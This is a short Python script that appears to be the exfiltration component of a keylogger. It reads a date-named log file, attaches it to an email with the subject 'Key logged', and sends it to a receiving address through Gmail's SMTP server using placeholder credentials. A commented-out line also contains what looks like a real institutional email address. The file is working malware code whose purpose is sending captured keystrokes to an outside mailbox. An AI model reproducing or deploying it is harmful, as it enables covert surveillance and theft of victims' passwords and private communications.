#!/usr/bin/env python3
################## IMPORTING ##########################
from fileinput import filename
import smtplib
import os
from email.message import EmailMessage
from datetime import date
##################################################
from datetime import date

var1 =  str(date.today())
disallowed_characters = ".-!"

for characters in disallowed_characters:
    var1=var1.replace(characters,"")

log_file = f'{var1}.txt'
#######################################################
email = 'email'
password = 'password'
#print(email)
semail =  'reciver email'
#with smtplib.SMTP('smtp.gmail.com',) as smtp:
#   smtp.login(email,password)
msg = EmailMessage()
msg['Subject'] = 'Key logged'
msg['From'] = email
msg['To'] = semail
msg.set_content('text attached')
################################
with open (log_file,"rb") as f:
    file_data = f.read()
    file_name = f.name

msg.add_attachment(file_data,maintype='text',subtype='plain',filename=log_file)
#####################################
with smtplib.SMTP_SSL('smtp.gmail.com',465) as smtp:
    smtp.login(email,password)

    smtp.send_message(msg)
#    smtp.sendmail('b19cs020@nitm.ac.in',semail,msg)
